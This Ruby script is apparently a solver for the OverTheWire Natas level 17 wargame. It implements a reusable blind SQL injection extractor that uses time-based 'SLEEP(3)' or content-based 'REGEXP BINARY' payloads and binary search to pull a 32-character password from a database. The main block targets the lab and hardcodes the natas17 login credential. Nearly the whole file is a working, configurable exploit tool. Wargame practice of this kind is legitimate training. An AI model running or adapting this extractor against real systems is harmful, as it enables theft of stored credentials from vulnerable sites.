#!/usr/bin/env ruby

require 'rubygems'
require 'bundler/setup'
Bundler.require(:default)

class NatasBlindSQLI
  def password_query_method_content regex_check
    "AND " + regex_check
  end

  def password_query_method_sleep regex_check
    "AND " + regex_check + " AND SLEEP(3)"
  end

  def password_query regex
    regex_check = "password REGEXP BINARY '#{regex}'"
    q = @sql_prefix + " "
    q << if sleep_method?
      password_query_method_sleep regex_check
    else
      password_query_method_content regex_check
    end
    q << " -- "
  end

  def send_password_match_request regex
    puts ' ' * 12 + "< #{password_query(regex)}"
    request_time_start = Time.now
    response = Unirest.post @url, auth: @auth,
                 parameters: { @post_param => password_query(regex) }
    request_time_finish = Time.now
    {
      response: response,
      time: request_time_finish - request_time_start
    }
  end

  def password_matches? regex
    request = send_password_match_request(regex)
    if sleep_method?
      puts "Request took: #{request[:time]}s"
      request[:time] > 2.9
    else # Content method
      request[:response].body.include? @content
    end
  end

  def sleep_method?
    !@content
  end

  # Keep halving the possible character set until we have just one
  def get_next_char extracted_password,
    num_chars_to_go = @length - extracted_password.length
    remainder = ".{#{num_chars_to_go-1}}"
    possible_charset = @charset
    while possible_charset.length > 1
      charset_slices = possible_charset.chars.each_slice((possible_charset.size/2.0).round).to_a.map(&:join)
      char_test = "[#{charset_slices[1]}]"
      regex = ['^', extracted_password, char_test, remainder, '$'].join
      matched = password_matches?(regex)
      puts ' ' * 18 + "> Matched: #{matched ? 'yes' : 'no'}"
      matching_slice = matched ? 1 : 0
      possible_charset = charset_slices[matching_slice]
      puts ' ' * 6 + "> #{possible_charset}"
    end
    possible_charset
  end

  def extract_password
    ''.tap do |extracted_password|
      @length.times do
        extracted_password << get_next_char(extracted_password)
        puts '', extracted_password
      end
    end
  end

  def initialize options = {}
    options = {
      charset: ['A'..'Z', 'a'..'z', '0'..'9'].map{|r|r.to_a}.flatten.join,
      length: 32,
      content: nil, # Use time-based strategy if no expected content is given
      prefix: nil,
      url: nil,
      auth: nil,
      post_param: nil,
      sql_prefix: '',
    }.merge(options).each { |k,v| instance_variable_set "@#{k}", v }
    puts "Using character set: #{@charset}"
    extract_password
  end
end

if __FILE__ == $0
  NatasBlindSQLI.new \
    url: "http://natas17.natas.labs.overthewire.org/",
    auth: { user: "natas17", password: "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"},
    post_param: :username,
    sql_prefix: 'natas18"'
end